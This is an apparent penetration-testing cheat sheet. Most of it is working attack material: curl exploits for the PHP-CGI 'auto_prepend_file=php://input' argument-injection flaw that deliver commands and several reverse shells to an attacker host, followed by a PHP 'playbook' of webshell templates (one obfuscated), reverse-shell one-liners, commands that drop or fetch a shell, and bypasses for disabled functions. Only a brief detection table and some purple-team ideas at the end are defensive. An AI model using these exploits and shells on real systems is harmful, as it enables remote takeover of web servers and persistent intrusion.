
# .. consolidated ..


— — — **Basic RCE Proof** — — —
```bash
curl -i -X POST \
  "http://HOST/cgi-bin/php-cgi?%ADd+auto_prepend_file%3Dphp://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary "whoami"
```

— — — **Simple PHP One-Liner Shell** — — —
```bash
curl -X POST \
  "http://HOST/cgi-bin/php-cgi?%ADd+auto_prepend_file%3Dphp://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary 'php -r '\''echo "[START]"; system("uname -a"); echo "[END]";'\'''
```

— — — **Bash TCP Reverse Shell** — — —
```bash
# Listener on attacker:
nc -lvnp PORT

# In pod (if bash exists):
curl -X POST \
  "http://HOST/cgi-bin/php-cgi?%ADd+auto_prepend_file%3Dphp://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary "bash -i >& /dev/tcp/ATT_IP/PORT 0>&1"
```

— — — **Sh FIFO Reverse Shell** — — —
```bash
nc -lvnp PORT

curl -X POST \
  "http://HOST/cgi-bin/php-cgi?%ADd+auto_prepend_file%3Dphp://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATT_IP PORT > /tmp/f"
```

— — — **Sh TCP Loop Reverse Shell** — — —
```bash
nc -lvnp PORT

curl -X POST \
  "http://HOST/cgi-bin/php-cgi?%ADd+auto_prepend_file%3Dphp://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary "(exec 5<>/dev/tcp/ATT_IP/PORT; while read cmd <&5; do \$cmd 2>&5 >&5; done) &"
```

— — — **PHP proc_open() Reverse Shell** — — —
```bash
nc -lvnp PORT

curl -X POST \
  "http://HOST/cgi-bin/php-cgi?%ADd+auto_prepend_file%3Dphp://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary 'php -r '\''$s=fsockopen("ATT_IP",PORT);if(!$s)exit;proc_open("/bin/sh",[0=>$s,1=>$s,2=>$s],$pipes);'\'''
```

— — — **Detach with nohup** — — —
```bash
nc -lvnp PORT

curl -X POST \
  "http://HOST/cgi-bin/php-cgi?%ADd+auto_prepend_file%3Dphp://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary "nohup sh -i >& /dev/tcp/ATT_IP/PORT 0>&1 &"
```

**Tips:**
- Always URL-encode the payload header `%ADd+auto_prepend_file%3Dphp://input`.  
- Ensure your listener is running before firing the curl.  
- Use `stty sane; reset` on your terminal if it gets messed up after a shell.  

These variations cover most environments (bash, sh, pure PHP) and ensure you get a stable, detached reverse shell.

##


# PHP Shells & Reverse Shells Playbook

A practical red/blue/purple team reference for using and detecting PHP-based shells in web environments.

---

## 📄 Webshell Templates

### Minimal GET Shell

```php
<?php system($_GET['cmd']); ?>
```

### Multi-function Shell

```php
<?php
$cmd = $_GET['cmd'];
if (function_exists('system')) system($cmd);
elseif (function_exists('passthru')) passthru($cmd);
elseif (function_exists('shell_exec')) echo shell_exec($cmd);
elseif (function_exists('exec')) { exec($cmd, $o); echo implode("\n", $o); }
?>
```

### Eval Shell

```php
<?php eval($_REQUEST['x']); ?>
```

### Obfuscated Var Shell

```php
<?php $c = "sy"."stem"; $c($_GET['cmd']); ?>
```

---

## 🚨 Reverse Shell One-Liners (PHP CLI)

> Start listener: `nc -lvnp PORT`

### fsockopen

```bash
php -r '$s=fsockopen("ATT_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### proc\_open

```bash
php -r '$s=fsockopen("ATT_IP",PORT);proc_open("/bin/sh", array(0=>$s, 1=>$s, 2=>$s), $pipes);'
```

### popen

```bash
php -r '$s=fsockopen("ATT_IP",PORT);popen("/bin/sh","r");'
```

### bash via system

```bash
php -r 'system("bash -c 'bash -i >& /dev/tcp/ATT_IP/PORT 0>&1'");'
```

### base64-encoded

```bash
php -r 'eval(base64_decode("..."));'
```

---

## 💾 File Drop / Fetch

### Write shell to disk

```php
file_put_contents("/var/www/html/shell.php", "<?php system(\$_GET['cmd']); ?>");
```

### Fetch shell remotely

```bash
php -r 'file_put_contents("dropper.php", file_get_contents("http://ATT_IP/shell.php"));'
```

---

## ⛔ When Functions Are Disabled

Fallbacks to try if `system`, `exec`, etc. are disabled:

```php
shell_exec('id');
passthru('id');
assert($_POST['x']);
eval(base64_decode($_POST['x']));
```

If all else fails:

* LFI + log injection
* Upload shell via image metadata (Exif)

---

## 🚡 Blue Team Detection Tips

| Indicator                | Source           | Defense                          |
| ------------------------ | ---------------- | -------------------------------- |
| `fsockopen`, `proc_open` | `php.ini` config | Disable with `disable_functions` |
| Long-running PHP process | `ps`, `lsof`     | Monitor children of apache/nginx |
| Shell-like access        | Web logs         | Monitor for `?cmd=` patterns     |
| Outbound TCP             | Netflow/SIEM     | Alert on unknown egress IPs      |

---

## 🧪 Purple Team Playbook Ideas

* Simulate shell drop with dummy IP
* Inject variants into WAF to test detection
* Replay shell input/output into a SIEM
* Confirm SOC alerting on shell process trees



